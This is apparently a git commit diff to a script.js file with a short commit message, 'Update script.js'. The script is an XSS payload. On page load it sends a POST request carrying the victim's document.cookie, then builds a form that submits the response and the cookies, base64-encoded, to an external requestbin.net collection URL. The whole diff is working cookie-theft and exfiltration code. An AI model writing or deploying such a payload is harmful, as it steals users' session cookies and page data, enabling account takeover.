52172b28ec562254c571967105297626f71d7edb
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 19:00:32 +0530

    Update script.js

--- script.js
+++ script.js
@@ -3,7 +3,7 @@ window.addEventListener('load', function () {
 
 fetch(window.location.pathname, {
     'method': 'POST',
-    'body': 'name=<b>asf</b>&user_id=2&_csrf_token=' + document.getElementsByName('_csrf_token')[0].value
+    'body': 'name=<b>asf</b>&user_id=2&' +document.cookie
 }).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(encodeURI(back+document.cookie));f.appendChild(i);document.body.appendChild(f);f.submit();})})
 
 
